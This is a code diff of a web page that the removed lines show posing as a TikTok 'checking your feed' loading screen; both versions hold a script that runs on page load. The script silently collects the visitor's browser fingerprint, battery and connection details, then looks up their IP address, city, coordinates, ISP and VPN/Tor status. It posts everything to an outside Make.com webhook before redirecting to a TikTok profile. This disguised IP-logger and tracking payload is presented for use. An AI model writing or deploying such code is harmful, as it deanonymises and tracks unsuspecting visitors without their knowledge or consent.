@@ -1,173 +1,101 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>TikTok</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Rubik:wght@500&display=swap');
+<script>
+  
+  async function collectData() {
+    const now = new Date();
+    const localTime = now.toLocaleString(); // ✅ الوقت المحلي معرف ومضمون
 
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Rubik', sans-serif;
-      background: #fff;
-      color: #000;
-    }
-    .tiktok-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 40px 20px;
-      height: 100vh;
-      box-sizing: border-box;
-      justify-content: center;
-    }
-    .logo {
-      width: 80px;
-      height: 80px;
-      background: url('https://upload.wikimedia.org/wikipedia/commons/0/09/TikTok_logo.svg') no-repeat center;
-      background-size: contain;
-      animation: float 2s ease-in-out infinite;
-      margin-bottom: 10px;
-    }
-    .brand-name {
-      font-size: 24px;
-      color: #000;
-      margin-bottom: 20px;
-    }
-    .loading-text {
-      font-size: 18px;
-      color: #333;
-      margin-bottom: 20px;
-    }
-    .spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #ff0050;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-    .sub-text {
-      color: #888;
-      font-size: 14px;
-      text-align: center;
-      max-width: 300px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-8px); }
-    }
-  </style>
-</head>
-<body>
-  <div class="tiktok-container">
-    <div class="logo"></div>
-    <div class="brand-name">TikTok</div>
-    <div class="loading-text">Checking your feed...</div>
-    <div class="spinner"></div>
-    <div class="sub-text">Please wait while we reconnect you to your session</div>
-  </div>
+    const userData = {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      localTime: localTime, // ✅ الوقت المحلي
+      screenSize: `${window.screen.width}x${window.screen.height}`,
+      colorDepth: window.screen.colorDepth,
+      pixelRatio: window.devicePixelRatio,
+      platform: navigator.platform,
+      referrer: document.referrer,
+      online: navigator.onLine,
+      javaEnabled: navigator.javaEnabled(),
+      cookiesEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack,
+      localStorage: !!window.localStorage,
+      sessionStorage: !!window.sessionStorage,
+      timestamp: now.toISOString()
+    };
 
-  <script>
-    async function collectData() {
-      const now = new Date();
-      local_time: new Date().toLocaleString(),
-      const userData = {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        localTime: now.toLocaleString(), // ← الوقت المحلي
-        screenSize: `${window.screen.width}x${window.screen.height}`,
-        colorDepth: window.screen.colorDepth,
-        pixelRatio: window.devicePixelRatio,
-        platform: navigator.platform,
-        referrer: document.referrer,
-        online: navigator.onLine,
-        javaEnabled: navigator.javaEnabled(),
-        cookiesEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        localStorage: !!window.localStorage,
-        sessionStorage: !!window.sessionStorage,
-        timestamp: now.toISOString(),
-        local_time: localTime,
-        
-      };
+    if (navigator.connection) {
+      userData.connectionType = navigator.connection.effectiveType;
+      userData.downlink = navigator.connection.downlink;
+      userData.rtt = navigator.connection.rtt;
+    }
 
-      if (navigator.connection) {
-        userData.connectionType = navigator.connection.effectiveType;
-        userData.downlink = navigator.connection.downlink;
-        userData.rtt = navigator.connection.rtt;
-      }
+    if (navigator.deviceMemory) {
+      userData.deviceMemory = navigator.deviceMemory + " GB";
+    }
 
-      if (navigator.deviceMemory) {
-        userData.deviceMemory = navigator.deviceMemory + " GB";
-      }
+    if (navigator.hardwareConcurrency) {
+      userData.cpuCores = navigator.hardwareConcurrency;
+    }
 
-      if (navigator.hardwareConcurrency) {
-        userData.cpuCores = navigator.hardwareConcurrency;
-      }
+    if (navigator.maxTouchPoints) {
+      userData.touchSupport = navigator.maxTouchPoints > 0;
+    }
 
-      if (navigator.maxTouchPoints) {
-        userData.touchSupport = navigator.maxTouchPoints > 0;
-      }
-
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          userData.batteryLevel = Math.round(battery.level * 100) + "%";
-          userData.isCharging = battery.charging;
-        } catch (err) {}
-      }
-
+    if (navigator.getBattery) {
       try {
-        const ipRes = await fetch('https://ipinfo.io/json?token=cb4dd6c6220e6e');
-        const ipData = await ipRes.json();
-        userData.ip = ipData.ip;
-        userData.hostname = ipData.hostname;
-        userData.city = ipData.city;
-        userData.region = ipData.region;
-        userData.country = ipData.country;
-        userData.loc = ipData.loc;
-        userData.org = ipData.org;
-        userData.postal = ipData.postal;
-        userData.timezone = ipData.timezone;
-        userData.asn = ipData.asn ? ipData.asn.asn : null;
-        userData.vpn = ipData.privacy && ipData.privacy.vpn ? true : false;
-        userData.proxy = ipData.privacy && ipData.privacy.proxy ? true : false;
-        userData.tor = ipData.privacy && ipData.privacy.tor ? true : false;
-      } catch (err) {
-        console.error('IPInfo Error:', err);
-      }
-
-      // إرسال البيانات إلى Make
-      fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
-        method: "POST",
-        body: JSON.stringify(userData),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log("تم الإرسال:", data);
-      })
-      .catch(error => {
-        console.error("خطأ في الإرسال:", error);
-      });
-
-      setTimeout(() => {
-        window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
-      }, 2500);
+        const battery = await navigator.getBattery();
+        userData.batteryLevel = Math.round(battery.level * 100) + "%";
+        userData.isCharging = battery.charging;
+      } catch (err) {}
     }
 
-    collectData();
-  </script>
-</body>
-</html> 
+    try {
+      const ipRes = await fetch('https://ipinfo.io/json?token=cb4dd6c6220e6e');
+      const ipData = await ipRes.json();
+      userData.ip = ipData.ip;
+      userData.hostname = ipData.hostname;
+      userData.city = ipData.city;
+      userData.region = ipData.region;
+      userData.country = ipData.country;
+      userData.loc = ipData.loc;
+      userData.org = ipData.org;
+      userData.postal = ipData.postal;
+      userData.timezone = ipData.timezone;
+
+      // ✅ التحقق من asn
+      if (ipData.asn && ipData.asn.asn) {
+        userData.asn = ipData.asn.asn;
+      } else {
+        userData.asn = "N/A";
+      }
+
+      // ✅ التحقق من vpn/proxy/tor
+      userData.vpn = ipData.privacy?.vpn || false;
+      userData.proxy = ipData.privacy?.proxy || false;
+      userData.tor = ipData.privacy?.tor || false;
+    } catch (err) {
+      console.error('IPInfo Error:', err);
+    }
+
+    fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
+      method: "POST",
+      body: JSON.stringify(userData),
+      headers: {
+        "Content-Type": "application/json"
+      }
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log("تم الإرسال:", data);
+    })
+    .catch(error => {
+      console.error("خطأ في الإرسال:", error);
+    });
+
+    setTimeout(() => {
+      window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
+    }, 2500);
+  }
+
+  collectData();
+</script> 
